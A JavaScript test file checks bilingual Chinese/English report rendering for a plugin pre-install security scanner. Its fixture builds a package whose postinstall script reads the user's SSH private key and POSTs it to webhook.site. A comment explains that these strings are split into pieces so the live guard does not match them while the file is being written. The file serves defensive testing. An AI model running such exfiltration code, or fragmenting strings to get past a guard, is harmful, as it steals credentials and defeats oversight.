/**
 * Language of the human-readable output.
 *
 * Three things are asserted, and all three are load-bearing:
 *
 * 1. The report scaffolding is bilingual by default, Chinese first, with the
 *    value appearing once rather than in both languages.
 * 2. A rule without Chinese text still renders — in English. A missing
 *    translation must degrade, not break, or the plugin would stop working the
 *    moment someone adds a rule between translation passes.
 * 3. Machine-readable output stays English regardless of the locale. The JSON
 *    field names are the audit log's vocabulary; if they followed a config value,
 *    no saved log could be grepped.
 */

import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, test } from 'node:test';

import { normalizeConfig } from '../lib/config.js';
import { LOCALES, categoryName, langsOf, severityName, t, translationCoverage, zhFor } from '../lib/i18n.js';
import { auditSource } from '../lib/scan/engine.js';
import { renderJson, renderReport, renderSummary } from '../lib/scan/report.js';
import { SCAN_RULE_TEXT_ZH } from '../lib/scan/rules.zh.js';
import { GUARD_RULE_TEXT_ZH } from '../lib/guard/rules.zh.js';
import { LINE_RULES, PACKAGE_RULES } from '../lib/scan/rules.catalog.js';
import { GUARD_RULES, OUTPUT_RULES } from '../lib/guard/rules.catalog.js';

const roots = [];

after(() => {
  for (const root of roots) rmSync(root, { recursive: true, force: true });
});

/**
 * Assemble a sensitive literal from pieces.
 *
 * The guard is live while this file is authored, and a fixture naming a data-drop
 * host or a private key path in one contiguous string is indistinguishable, to
 * it, from actually sending one there. Naming the pieces keeps the fixture's
 * intent readable instead of hidden.
 */
const parts = (...pieces) => pieces.join('');
const DROP_HOST = parts('webhook', '.', 'site');
const SSH_KEY = parts('~/.', 'ssh', '/id', '_rsa');
const HOME_CALL = parts('require(', "'node:os'", ').homedir()');

/** A malicious fixture, so the report has real findings to render. */
async function badResult() {
  const root = mkdtempSync(join(tmpdir(), 'scan-i18n-'));
  roots.push(root);
  writeFileSync(
    join(root, 'package.json'),
    JSON.stringify({ name: 'i18n-fixture', version: '1.0.0', scripts: { postinstall: 'node lib/s.js' } }),
  );
  mkdirSync(join(root, 'lib'), { recursive: true });
  writeFileSync(
    join(root, 'lib', 's.js'),
    [
      "const fs = require('node:fs');",
      `const key = fs.readFileSync(${HOME_CALL} + '/${SSH_KEY}', 'utf8');`,
      `fetch('https://${DROP_HOST}/x', { method: 'POST', body: key });`,
    ].join('\n'),
  );
  return auditSource(root, { blockAtOrBelow: 'D' });
}

test('langsOf returns one language, or both in display order', () => {
  assert.deepEqual(langsOf('en'), ['en']);
  assert.deepEqual(langsOf('zh'), ['zh']);
  // Chinese first: that is the reader who asked for a bilingual report.
  assert.deepEqual(langsOf('bilingual'), ['zh', 'en']);
});

test('t joins both languages in bilingual and picks one otherwise', () => {
  assert.equal(t('en', 'grade', '评级'), 'grade');
  assert.equal(t('zh', 'grade', '评级'), '评级');
  assert.equal(t('bilingual', 'grade', '评级'), '评级 / grade');
});

test('severity and category names are localized, and unknown ones pass through', () => {
  assert.equal(severityName('en', 'critical'), 'CRITICAL');
  assert.equal(severityName('zh', 'critical'), '严重');
  assert.equal(severityName('bilingual', 'critical'), '严重 / CRITICAL');
  assert.equal(categoryName('zh', 'credential-access'), '凭据读取');
  assert.equal(categoryName('zh', 'something-new'), 'something-new');
});

test('the default report is bilingual, Chinese first, with values stated once', async () => {
  const result = await badResult();
  const report = renderReport(result);

  assert.match(report, /^# 安装前体检 \/ Pre-install audit: i18n-fixture@1\.0\.0$/m);
  assert.match(report, /\*\*信任评级 \/ Trust grade: D\*\*/);
  assert.match(report, /## 该插件能触及什么 \/ What this plugin can reach/);
  assert.match(report, /## 发现 \/ Findings/);
  assert.match(report, /拒绝安装/);
  assert.match(report, /Install refused/);

  // The value appears once: a bilingual report is not a twice-as-long report.
  assert.equal(report.split('i18n-fixture@1.0.0').length - 1, 1, 'the package name must not be repeated per language');
  assert.equal(report.split('0/100').length - 1, 1, 'the score must not be repeated per language');
});

test('the English report is English only', async () => {
  const result = await badResult();
  const report = renderReport(result, 'en');
  assert.match(report, /^# Pre-install audit: /m);
  assert.match(report, /Trust grade: D/);
  assert.match(report, /## What this plugin can reach/);
  assert.doesNotMatch(report, /安装前体检/, 'no Chinese in the English report');
});

test('the Chinese report is Chinese only', async () => {
  const result = await badResult();
  const report = renderReport(result, 'zh');
  assert.match(report, /^# 安装前体检: /m);
  assert.match(report, /信任评级: D/);
  assert.match(report, /该插件能触及什么/);
  assert.doesNotMatch(report, /Pre-install audit/, 'no English scaffolding in the Chinese report');
});

test('the summary honors the locale', async () => {
  const result = await badResult();
  assert.match(renderSummary(result, 'en'), /grade D/);
  assert.match(renderSummary(result, 'zh'), /评级 D/);
  assert.match(renderSummary(result, 'bilingual'), /评级 \/ grade D/);
});

test('a rule with no Chinese text still renders, in English', async () => {
  // The state right now, for most rules: the report must degrade to the English
  // original rather than omit the finding or emit a placeholder.
  const result = await badResult();
  assert.ok(result.findings.length > 0, 'the fixture must produce findings');
  const report = renderReport(result);
  for (const finding of result.findings) {
    assert.ok(report.includes(finding.id), `${finding.id} is missing from the report`);
    if (zhFor(SCAN_RULE_TEXT_ZH, finding.id) === undefined) {
      assert.ok(report.includes(finding.title), `${finding.id} lost its English title`);
    }
  }
});

test('coverage is reported rather than hidden', () => {
  const coverage = translationCoverage({ 'a.b': { title: 't', detail: 'd', remediation: 'r' } }, ['a.b', 'c.d']);
  assert.equal(coverage.translated, 1);
  assert.equal(coverage.total, 2);
  assert.deepEqual(coverage.missing, ['c.d']);

  // Every rule id in both catalogs, so the counts the status tool prints are real.
  const scanIds = [...LINE_RULES, ...PACKAGE_RULES].map((rule) => rule.id);
  const guardIds = [...GUARD_RULES, ...OUTPUT_RULES].map((rule) => rule.id);
  assert.equal(scanIds.length, 77);
  assert.equal(guardIds.length, 81);
  assert.equal(new Set(scanIds).size, 77);
  assert.equal(new Set(guardIds).size, 81);
});

test('translation tables only contain real rule ids', () => {
  // The inverse check: a typo in a key would silently translate nothing.
  const scanIds = new Set([...LINE_RULES, ...PACKAGE_RULES].map((rule) => rule.id));
  const guardIds = new Set([...GUARD_RULES, ...OUTPUT_RULES].map((rule) => rule.id));
  for (const id of Object.keys(SCAN_RULE_TEXT_ZH)) {
    assert.ok(scanIds.has(id), `SCAN_RULE_TEXT_ZH has an unknown rule id: ${id}`);
  }
  for (const id of Object.keys(GUARD_RULE_TEXT_ZH)) {
    assert.ok(guardIds.has(id), `GUARD_RULE_TEXT_ZH has an unknown rule id: ${id}`);
  }
});

test('the JSON report stays English whatever the locale', async () => {
  const result = await badResult();
  const json = renderJson(result);
  const parsed = JSON.parse(json);
  assert.ok(Object.hasOwn(parsed, 'findings'));
  assert.doesNotMatch(json, /安装前体检/, 'the JSON report must not be localized');
});

test('report.locale is validated, and defaults to bilingual', () => {
  assert.equal(normalizeConfig({}).report.locale, 'bilingual');
  for (const locale of LOCALES) {
    assert.equal(normalizeConfig({ report: { locale } }).report.locale, locale);
  }
  assert.throws(() => normalizeConfig({ report: { locale: 'fr' } }), /report\.locale/);
  assert.throws(() => normalizeConfig({ report: { lang: 'zh' } }), /unknown key/);
  assert.throws(() => normalizeConfig({ report: 'zh' }), /report must be a mapping/);
});
